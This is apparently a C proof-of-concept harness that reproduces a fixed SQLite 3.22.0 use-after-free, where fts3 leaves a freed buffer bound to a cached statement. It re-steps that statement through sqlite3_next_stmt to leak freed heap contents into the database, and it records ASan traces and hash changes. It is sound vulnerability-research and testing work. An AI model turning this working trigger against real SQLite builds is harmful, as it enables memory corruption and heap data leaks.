/* new-3 / sqlite-eab0e10304 -- fts3/fts5/rtree leave a freed heap buffer bound
 * SQLITE_STATIC to a PERSISTENT cached statement.
 *
 * fts3's segment writer binds its own buffer into the cached segdir statement and
 * then frees it, with no bind_null in between:
 *     sqlite3_bind_blob(pStmt, 6, zRoot, nRoot, SQLITE_STATIC);
 *     sqlite3_step(pStmt);
 *     rc = sqlite3_reset(pStmt);
 * sqlite3_reset() does NOT clear bindings, so parameter 6 keeps pointing at the
 * buffer after fts3SegWriterFree() releases it. Fixed 3.23.0 -- 16 days after
 * 3.22.0 shipped -- by adding the bind_null. The fix's own commit message states
 * the threat model: "a user may obtain a pointer to the persistent statement using
 * sqlite3_next_stmt() and attempt to access the freed buffer using
 * sqlite3_expanded_sql() or similar".
 *
 * WHY THIS DOMAIN DOES NOT USE sqlite3_expanded_sql().
 * It cannot: this port compiles with -DSQLITE_OMIT_FLOATING_POINT=1, and 3.22.0's
 * sqliteInt.h reacts to that with
 *     #define SQLITE_OMIT_DATETIME_FUNCS 1
 *     #define SQLITE_OMIT_TRACE 1
 * so sqlite3_expanded_sql() is compiled as `return 0;` in EVERY group of this port.
 * A command-line -USQLITE_OMIT_TRACE does not help, because the #define happens
 * inside the translation unit. (This was verified with a dedicated probe: every
 * expanded_sql call returns NULL even for a no-parameter statement in the smallest
 * image with a completely idle arena, and the arena serves all size classes from 64
 * to 16384 bytes. An earlier session blamed memsys5 fragmentation; that was wrong.)
 *
 * So this domain takes the "or similar" route the fix names: re-STEP the cached
 * statement without rebinding. Parameter 6 still points at the freed buffer, so
 * OP_MakeRecord reads it and REPLACEs the %_segdir row with whatever is there now.
 *
 * Host ASan oracle on 3.22.0, same shape:
 *   re-step  : READ of size 1492, 0 bytes into a freed 4064-byte region
 *                use   sqlite3VdbeSerialPut <- sqlite3VdbeExec <- sqlite3_step
 *   expanded : READ of size 1    (upstream's route, for comparison)
 *   free  fts3SegWriterFree <- fts3SegmentMerge <- fts3DoOptimize
 *           <- fts3SpecialInsert <- sqlite3Fts3UpdateMethod
 *   alloc fts3SegWriterAdd <- fts3SegmentMerge
 *
 * This route is also OBSERVABLE without any memory-safety tool, which matters
 * because on base Capstone the read is silent (the buffer is read as bytes, not as
 * a pointer). On the host the re-step rewrites the row with DIFFERENT content at the
 * same length, and the index is corrupt afterwards:
 *     before len=1492 sum=3696465335 first4=0006616c
 *     after  len=1492 sum=951463155  first4=60ed69d4   <- looks like a heap pointer
 *     integrity-check -> SQLITE_CORRUPT
 * In the domain memsys5 writes its in-band Mem5Link freelist ints over the start of
 * the freed block, so a changed hash here is the freed block's new contents being
 * copied into the database.
 * NOTE: -DSQLITE_DQS=0, so SQL string literals must be single-quoted. */
#include "repro322_common.h"

static void rcline(const char *what, int rc){
  out_text("staticbind "); out_text(what); out_text(" rc=");
  out_uint((unsigned)(rc<0?-rc:rc)); out_text("\n");
}

/* FNV-1a over the first %_segdir root blob, plus its length and first 4 bytes. */
static int roothash(sqlite3 *db, unsigned *pLen, unsigned *pSum, unsigned *pFirst){
  sqlite3_stmt *st = 0; int ok = 0;
  *pLen = 0; *pSum = 0; *pFirst = 0;
  if( sqlite3_prepare_v2(db,
        "SELECT root FROM ft_segdir ORDER BY level,idx LIMIT 1",-1,&st,0)==SQLITE_OK
      && sqlite3_step(st)==SQLITE_ROW ){
    const unsigned char *p = sqlite3_column_blob(st,0);
    int n = sqlite3_column_bytes(st,0), i;
    unsigned sum = 2166136261u;
    if( p ){
      for(i=0;i<n;i++) sum = (sum ^ p[i]) * 16777619u;
      *pLen = (unsigned)n; *pSum = sum;
      if( n>=4 ) *pFirst = ((unsigned)p[0]<<24)|((unsigned)p[1]<<16)|((unsigned)p[2]<<8)|p[3];
      ok = 1;
    }
  }
  sqlite3_finalize(st);
  return ok;
}

static int count1(sqlite3 *db, const char *sql){
  sqlite3_stmt *st=0; int v=-1;
  if(sqlite3_prepare_v2(db,sql,-1,&st,0)==SQLITE_OK && sqlite3_step(st)==SQLITE_ROW)
    v = sqlite3_column_int(st,0);
  sqlite3_finalize(st); return v;
}

/* needle search, no libc string.h in the domain */
static int contains(const char *hay, const char *nee){
  if(!hay || !nee) return 0;
  for(; *hay; hay++){
    const char *h=hay, *n=nee;
    while(*n && *h==*n){ h++; n++; }
    if(!*n) return 1;
  }
  return 0;
}

static int run_case(void){
  if (repro_init()) return 1;
  sqlite3 *db=0; char *e=0; int rc, i;

  rc = sqlite3_open(":memory:", &db);
  rcline("open", rc);
  if(rc!=SQLITE_OK){ sqlite3_close(db); return 1; }

  rc = sqlite3_exec(db,"CREATE VIRTUAL TABLE ft USING fts4(a);",0,0,&e);
  rcline("create", rc);
  if(e){ out_text("staticbind create err ("); out_text(e); out_text(")\n"); sqlite3_free(e); e=0; }
  if(rc!=SQLITE_OK){ sqlite3_close(db); return 1; }

  /* enough distinct terms that the optimize below produces a multi-KB root blob */
  sqlite3_stmt *ins=0;
  if(sqlite3_prepare_v2(db,"INSERT INTO ft VALUES(?)",-1,&ins,0)!=SQLITE_OK){
    out_text("staticbind insert prepare err ("); out_text(sqlite3_errmsg(db)); out_text(")\n");
    sqlite3_close(db); return 1;
  }
  int nins=0;
  for(i=0;i<40;i++){
    char buf[96]; int k=0;
    const char *pre[4] = {"alpha","beta","gamma","delta"};
    int j;
    for(j=0;j<4;j++){
      const char *w = pre[j]; while(*w) buf[k++]=*w++;
      buf[k++] = (char)('0' + (i/10)); buf[k++] = (char)('0' + (i%10));
      buf[k++] = ' ';
    }
    { const char *tail = "epsilon zeta eta theta"; while(*tail) buf[k++]=*tail++; }
    buf[k]=0;
    sqlite3_bind_text(ins,1,buf,-1,SQLITE_TRANSIENT);
    if(sqlite3_step(ins)==SQLITE_DONE) nins++;
    sqlite3_reset(ins);
  }
  sqlite3_finalize(ins);
  out_text("staticbind inserted="); out_uint((unsigned)nins); out_text("\n");

  /* optimize merges the segments: the writer allocates its buffer, binds it
   * SQLITE_STATIC into the cached segdir statement, steps, resets, then frees it */
  rc = sqlite3_exec(db,"INSERT INTO ft(ft) VALUES('optimize');",0,0,&e);
  rcline("optimize", rc);
  if(e){ out_text("staticbind optimize err ("); out_text(e); out_text(")\n"); sqlite3_free(e); e=0; }

  int rows_before = count1(db,"SELECT count(*) FROM ft_segdir");
  out_text("staticbind segdir_rows="); out_uint((unsigned)(rows_before<0?0:rows_before)); out_text("\n");

  unsigned l1,s1,f1,l2,s2,f2;
  int have1 = roothash(db,&l1,&s1,&f1);
  out_text("staticbind before present="); out_uint((unsigned)have1);
  out_text(" len="); out_uint(l1); out_text(" sum="); out_uint(s1);
  out_text(" first4="); out_uint(f1); out_text("\n");
  if(!have1 || l1 < 64){
    out_text("staticbind WARNING no usable root blob; the dangling binding was never made\n");
    sqlite3_close(db); out_text("staticbind NOTRAP done\n"); return 0;
  }

  /* find the PERSISTENT cached segdir statement through the public API */
  sqlite3_stmt *target = 0; int nstmt=0, nsql=0;
  { sqlite3_stmt *s;
    for(s = sqlite3_next_stmt(db,0); s; s = sqlite3_next_stmt(db,s)){
      const char *z = sqlite3_sql(s);
      nstmt++;
      if(z){ nsql++;
        if(contains(z,"segdir") && contains(z,"VALUES")) target = s;
      }
    }
  }
  out_text("staticbind cached_stmts="); out_uint((unsigned)nstmt);
  out_text(" with_sql="); out_uint((unsigned)nsql);
  out_text(" target="); out_uint((unsigned)(target!=0)); out_text("\n");
  if(!target){
    out_text("staticbind WARNING segdir statement not reachable via next_stmt\n");
    sqlite3_close(db); out_text("staticbind NOTRAP done\n"); return 0;
  }
  out_text("staticbind target sql=["); out_text(sqlite3_sql(target)); out_text("]\n");

  /* THE USE: re-step with parameter 6 still pointing at the freed buffer */
  out_text("staticbind before re-step\n");
  int srq = sqlite3_step(target);
  out_text("staticbind restep rc="); out_uint((unsigned)(srq<0?-srq:srq)); out_text("\n");
  sqlite3_reset(target);

  int rows_after = count1(db,"SELECT count(*) FROM ft_segdir");
  int have2 = roothash(db,&l2,&s2,&f2);
  out_text("staticbind after present="); out_uint((unsigned)have2);
  out_text(" len="); out_uint(l2); out_text(" sum="); out_uint(s2);
  out_text(" first4="); out_uint(f2); out_text("\n");
  out_text("staticbind rows_after="); out_uint((unsigned)(rows_after<0?0:rows_after)); out_text("\n");

  /* DECISIVE: same length, different content == the freed block's new contents
   * were copied into the database by the re-step. */
  out_text("staticbind VERDICT len_changed="); out_uint((unsigned)(l1!=l2));
  out_text(" sum_changed="); out_uint((unsigned)(s1!=s2));
  out_text(" first4_changed="); out_uint((unsigned)(f1!=f2)); out_text("\n");
  if(s1==s2) out_text("staticbind note content unchanged; the read was silent and the"
                      " freed block had not been reused yet\n");

  rc = sqlite3_exec(db,"INSERT INTO ft(ft) VALUES('integrity-check');",0,0,&e);
  rcline("integrity", rc);
  if(e){ out_text("staticbind integrity err ("); out_text(e); out_text(")\n"); sqlite3_free(e); e=0; }

  sqlite3_close(db);
  out_text("staticbind NOTRAP done\n"); return 0;
}
REPRO322_MAIN("staticbind")
